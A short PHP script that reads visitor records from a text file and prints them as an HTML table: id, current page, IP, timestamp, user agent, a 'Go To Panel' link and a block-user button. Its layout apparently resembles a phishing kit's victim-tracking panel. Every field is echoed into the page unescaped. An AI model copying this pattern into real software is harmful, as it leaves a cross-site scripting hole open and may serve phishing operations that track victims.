<?php 

$user_data = file("./get-panel/info-panel.txt", FILE_IGNORE_NEW_LINES);           
foreach ($user_data as $line) {
    list($id_user,$current_page,$user_ip,$timestamp,$user_agent,$link_panel,$block_user) = explode(",", $line);
    echo "<tr class='information-user'>";
    echo "<td>$id_user</td>";
    echo "<td>$current_page</td>";
    echo "<td>$user_ip</td>";
    echo "<td>$timestamp</td>";
    echo "<td>$user_agent</td>";
    echo "<td><a href='$link_panel' target='_blank'>Go To Panel</a></td>";
    echo "<td><form action='block_user.php' method='post'><input type='hidden' name='user_id' value='$id_user'><button type='submit' name='block_user' value='$block_user'><i class='fa-solid fa-user-minus'></i></button></form></td>";
    echo "</tr>";
}


?>